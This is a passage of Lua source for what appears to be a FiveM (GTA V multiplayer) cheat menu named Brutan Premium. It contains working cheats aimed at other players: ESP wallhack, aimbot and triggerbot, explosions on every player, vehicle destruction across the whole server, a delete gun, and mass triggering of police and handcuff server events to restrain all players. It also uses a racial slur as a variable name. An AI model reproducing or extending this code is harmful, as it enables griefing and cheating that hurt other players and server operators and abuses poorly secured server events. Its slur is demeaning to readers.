                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        cN.r,
                                        cN.g,
                                        cN.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end

            if crosshair2 then
                ch("~r~+",0.495,0.484)
            end

            if crosshair3 then
                ch("~r~.",0.4968,0.478)
            end

            local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)

            if fall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end

			if freezeall then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent("cuffServer", GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
						TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
					end
				end
			
            if blowall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0, false)
                end
            end

            if sall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    local vehiclehash = GetHashKey("savage")
                    RequestModel(vehiclehash)
                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                end
            end

            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end


                if superGrip then
                    SetVehicleGravityAmount(niggerVehicle, 20.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if enchancedGrip then
                    SetVehicleGravityAmount(niggerVehicle, 12.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if fdMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.5)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                end

                if t2x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
                end

                if t4x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
                end

                if t8x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
                end

                if t16x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
                end
            end


            if Noclip then
        local noclip_speed = 1.0
        local ped = GetPlayerPed(-1)
        local x,y,z = getPosition()
        local dx,dy,dz = getCamDirection()
        local speed = noclip_speed
		SetEntityVisible(GetPlayerPed(-1), false, false)
		SetEntityInvincible(GetPlayerPed(-1), true)
		SetEntityVisible(ped, false);

      SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
      if IsControlPressed(0, 21) then
          speed = speed + 3
          end
      if IsControlPressed(0, 19) then
          speed = speed - 0.5
      end
             if IsControlPressed(0,32) then
              x = x+speed*dx
              y = y+speed*dy
              z = z+speed*dz
               end


               if IsControlPressed(0,269) then
              x = x-speed*dx
              y = y-speed*dy
              z = z-speed*dz
               end
        SetEntityCoordsNoOffset(ped,x,y,z,true,true,true)
            else
            SetEntityVisible(GetPlayerPed(-1), true, false)
            SetEntityInvincible(GetPlayerPed(-1), false)

         end

            if WADOHWIB then
                local gotEntity = getEntity(PlayerId())
                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                    drawNotification("Aim Your Gun At An Entity And Shoot!")
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
                        if IsPlayerFreeAiming(PlayerId()) then
                            if IsEntityAPed(gotEntity) then
                                if IsPedInAnyVehicle(gotEntity, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~r~FUCKED")
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~r~FUCKED")
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
                                    DeleteEntity(gotEntity)
                                    drawNotification("~r~FUCKED!")
                                end
                            end
                        end
                    end
                end
            end
			if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle, true)
                        SetVehicleEngineHealth(vehicle, 0)
                    end
                end
            end
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end
			
            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        local a8 = k(1.0)
                        local d7 = GetPlayerPed(i)
                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                        local x, y, z = table.unpack(GetEntityCoords(d7))
                        local db =
                            '~h~Name: ' ..
                            GetPlayerName(i) ..
                                '\nServer ID: ' ..
                                    GetPlayerServerId(i) ..
                                        '\nPlayer ID: ' ..
                                            i ..
                                                '\nDist: ' ..
                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
                        if IsPedInAnyVehicle(d7, true) then
                            local dc =
                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
                            db = db .. '\nVeh: ' .. dc
                        end
                        if KDOWJDw and esp then
                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
                        end
                        if jfjfjffuhguh and esp then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                        end
                        if jfjfjf and esp then
                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
                        end
                    end
                end
            end

            if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
                    SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
                end

            if rainbowTint then
                for i = 0, #allWeapons do
                    if HasPedGotWeapon(PlayerPedId(), GetHashKey(allWeapons[i])) then
                        SetPedWeaponTintIndex(PlayerPedId(), GetHashKey(allWeapons[i]), math.random(0, 7))
                    end
                end
            end

            if showCoords then
                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl))
                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
				local playerPedsss = PlayerPedId()
				roundzxx = GetEntityHeading(playerPedsss)
                bf("~r~X:~s~ "..roundx,0.05,0.00)
                bf("~r~Y:~s~ "..roundy,0.11,0.00)
                bf("~r~Z:~s~ "..roundz,0.17,0.00)
				bf("~r~H:~s~ "..roundzxx,0.23,0.00)
            end

            if bulletGun then
                local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                startDistance = startDistance + 0.25
                endDistance = endDistance + 1000.0

                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local bullet = GetHashKey(bullets[selectedBullet])
                    if not HasWeaponAssetLoaded(bullet) then
                        RequestWeaponAsset(bullet, 31, false)
                        while not HasWeaponAssetLoaded(bullet) do
                            Citizen.Wait(0)
                        end
                    end
                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
                end

            end

            if vehicleGun then
                local heading = GetEntityHeading(PlayerPedId())
                local model = GetHashKey(vehicles[selectedVehicle])
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                RequestModel(model)
                while not HasModelLoaded(model) do
                    debugPrint("Loading Model...")
                    Citizen.Wait(0)
                end

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        if IsPedOnFoot(PlayerPedId()) then
                        local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                        SetModelAsNoLongerNeeded(model)
                        SetVehicleAsNoLongerNeeded(veh)
                        end
                    end
                end
            end

            if pedGun then
                local heading = GetEntityHeading(PlayerPedId())
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                local model = GetHashKey(peds[selectedPed])

                RequestModel(model)
                while not HasModelLoaded(model) do
                    Citizen.Wait(0)
                end

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetEntityRecordsCollisions(spawnedPed, true)
                        for f = 0.0, 75.0 do
                            if HasEntityCollidedWithAnything(spawnedPed) then break end
                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                        end
                    end
                end
            end

            if forceGun then
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local heading = GetEntityHeading(PlayerPedId())
                if IsPedShooting(PlayerPedId()) then
                    local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if aiming then
                        if IsPedInAnyVehicle(entity) then
                            local veh = GetVehiclePedIsUsing(entity)
                            DeleteEntity(entity)
                            SetEntityHeading(veh, heading)
                            SetVehicleForwardSpeed(veh, 150.0)
                        else
                            for i = 0, 10 do
                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                            end
                        end
                    end
                end
            end

					if IsControlPressed(0, 323) and DoesEntityExist(Deer.Handle) then
		Deer.Destroy()
		end
			
            if bifegfubffff then
                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end
			
			 if rainbow then
                    local color = k(1.0)
                    for i = 0, #allMenus do
                        BrutanPremium.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
                    end  
                    for i, dA in pairs(bd) do                 
                        BrutanPremium.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
                    end
                    for i, dA in pairs(be) do 
                        BrutanPremium.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
                    end
                end
                
                if animated then                                   
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
                            end
                            for i, dA in pairs(bd) do
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                
                            end      
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
                            end
                            for i, dA in pairs(bd) do
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
                            end
                            for i, dA in pairs(bd) do
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
                            end
                            for i, dA in pairs(bd) do
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                
                            end                          
                end
			
			if explosiveAmmo then
                local impact1, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact1 then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(200)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(200)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(150)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(150)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end

			if RainbowVeh then
                local u48y34 = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if ou328hSync then
                local u48y34 = k(1.0)
				local ped = PlayerPedId()
                local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			
			if ou328hNeon then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if LOJWDNDDNDN then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
               SetVehicleDirtLevel(veh, 1.0)
				else
            end
			
			if CLEAR then
								SetWeatherTypePersist("CLEAR")
        SetWeatherTypeNowPersist("CLEAR")
        SetWeatherTypeNow("CLEAR")
        SetOverrideWeather("CLEAR")
		end
		
					if BLIZZARD then
								SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		
					if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
		
					if EXTRASUNNY then
								SetWeatherTypePersist("EXTRASUNNY")
        SetWeatherTypeNowPersist("EXTRASUNNY")
        SetWeatherTypeNow("EXTRASUNNY")
        SetOverrideWeather("EXTRASUNNY")
		end
			
			if XMAS then
			            SetForceVehicleTrails(true)
            SetForcePedFootstepsTracks(true)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end
			
            if LOJ38 then
                for i = 0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local TargetPed = GetPlayerPed(i)
                            local TargetPos = GetEntityCoords(TargetPed)
                            local Exist = DoesEntityExist(TargetPed)
                            local Dead = IsPlayerDead(TargetPed)

                            if Exist and not Dead then
                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                if IsEntityVisible(TargetPed) and OnScreen then
                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                    end
                                end
                            end
                        end
                    end
                end
            end
			
			if IsControlJustReleased(0, Keys['X']) then
			ClearPedTasks(PlayerPedId())
		end
			
						if Nigubdddddd then 
			local veh = GetVehiclePedIsUsing(PlayerPedId(-1))
			if IsControlPressed(0, 232) then
			SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
			end
				if veh ~= nil then
					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 36.0)
					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 60.0);
				end
			end

			            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
			
            if TriggerBot then
                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                if Aiming then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end

            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
			
			if godmode then
			SetEntityInvincible(GetPlayerPed(-1), true)
			SetPlayerInvincible(PlayerId(), true)
			SetPedCanRagdoll(GetPlayerPed(-1), false)
			ClearPedBloodDamage(GetPlayerPed(-1))
			ResetPedVisibleDamage(GetPlayerPed(-1))
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), true, true, true, true, true, true, true, true)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), false)
			SetEntityCanBeDamaged(GetPlayerPed(-1), false)
		else
			SetEntityInvincible(GetPlayerPed(-1), false)
			SetPlayerInvincible(PlayerId(), false)
			SetPedCanRagdoll(GetPlayerPed(-1), true)
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), false, false, false, false, false, false, false, false)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), true)
			SetEntityCanBeDamaged(GetPlayerPed(-1), true)
		end

		if discordPresence then
                    SetDiscordAppId(628637344098025482)
            
                    SetDiscordRichPresenceAsset('Brutan Premium')
                    
					SetRichPresence('Brutan#7799')
			
                    SetDiscordRichPresenceAssetText('Brutan Premium | Lol Fuck you')
                
                    SetDiscordRichPresenceAssetSmall('Brutan Premium')
            
                    SetDiscordRichPresenceAssetSmallText('BRUTAN ON YOUTUBE')
            
                end
		
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end
			
			if NOXJDSS then
                local cI = {
                    [453432689] = 1.0,
                    [3219281620] = 1.0,
                    [1593441988] = 1.0,
                    [584646201] = 1.0,
                    [2578377531] = 1.0,
                    [324215364] = 1.0,
                    [736523883] = 1.0,
                    [2024373456] = 1.0,
                    [4024951519] = 1.0,
                    [3220176749] = 1.0,
                    [961495388] = 1.0,
                    [2210333304] = 1.0,
                    [4208062921] = 1.0,
                    [2937143193] = 1.0,
                    [2634544996] = 1.0,
                    [2144741730] = 1.0,
                    [3686625920] = 1.0,
                    [487013001] = 1.0,
                    [1432025498] = 1.0,
                    [2017895192] = 1.0,
                    [3800352039] = 1.0,
                    [2640438543] = 1.0,
                    [911657153] = 1.0,
                    [100416529] = 1.0,
                    [205991906] = 1.0,
                    [177293209] = 1.0,
                    [856002082] = 1.0,
                    [2726580491] = 1.0,
                    [1305664598] = 1.0,
                    [2982836145] = 1.0,
                    [1752584910] = 1.0,
                    [1119849093] = 1.0,
                    [3218215474] = 1.0,
                    [1627465347] = 1.0,
                    [3231910285] = 1.0,
                    [-1768145561] = 1.0,
                    [3523564046] = 1.0,
                    [2132975508] = 1.0,
